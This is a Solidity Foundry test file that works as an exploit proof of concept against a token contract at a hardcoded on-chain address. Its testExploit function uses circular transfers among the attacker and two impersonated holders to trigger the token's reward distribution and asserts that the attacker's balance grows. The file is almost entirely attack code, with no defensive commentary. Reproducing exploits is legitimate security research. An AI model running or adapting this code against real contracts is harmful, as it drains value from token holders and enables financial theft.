pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x16bE19fB70F902EcF39b54aD988eE427cB1b6848;
    address attacker = address(this);
    address holder1 = address(0x111);
    address holder2 = address(0x222);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label addresses for debugging
        vm.label(holder1, "Holder1");
        vm.label(holder2, "Holder2");

        // Get initial MANU tokens for attacker (need some to start transfers)
        deal(TARGET, attacker, 1000 * 10**18);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get initial balances
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Step 2: Transfer to holder1 to add to _accounts array
        uint256 transferAmount = 100 * 10**18;
        IERC20(TARGET).transfer(holder1, transferAmount);
        console.log("Transferred to holder1");

        // Step 3: Transfer to holder2 to add to _accounts array
        IERC20(TARGET).transfer(holder2, transferAmount);
        console.log("Transferred to holder2");

        // Step 4: Perform circular transfers to trigger reward distribution
        // We need to impersonate holders to transfer from them

        // First transfer: holder1 -> holder2
        vm.prank(holder1);
        IERC20(TARGET).transfer(holder2, 10 * 10**18);
        console.log("holder1 -> holder2");

        // Second transfer: holder2 -> attacker
        vm.prank(holder2);
        IERC20(TARGET).transfer(attacker, 10 * 10**18);
        console.log("holder2 -> attacker");

        // Third transfer: attacker -> holder1
        IERC20(TARGET).transfer(holder1, 10 * 10**18);
        console.log("attacker -> holder1");

        // Repeat the cycle multiple times to accumulate tokens
        for (uint i = 0; i < 5; i++) {
            vm.prank(holder1);
            IERC20(TARGET).transfer(holder2, 5 * 10**18);

            vm.prank(holder2);
            IERC20(TARGET).transfer(attacker, 5 * 10**18);

            IERC20(TARGET).transfer(holder1, 5 * 10**18);
        }

        // Check final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalBalance);
        console.log("Balance increase:", finalBalance - initialBalance);

        // Verify exploit succeeded - attacker balance should increase
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

